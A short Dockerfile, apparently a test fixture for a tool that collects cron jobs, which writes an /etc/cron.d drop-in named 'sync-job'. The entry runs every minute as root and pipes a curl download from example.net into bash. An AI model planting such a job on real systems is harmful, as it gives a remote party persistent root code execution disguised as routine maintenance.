# /etc/cron.d/*, not a personal crontab — a personal crontab needs a real `crontab` binary
# and a scheduler-managed spool file that plain ubuntu:24.04 doesn't ship by default. Cron
# drop-ins are just files the collector reads directly, no cron daemon required.
FROM ubuntu:24.04
RUN echo '* * * * * root curl -s https://example.net/update.sh | bash' > /etc/cron.d/sync-job
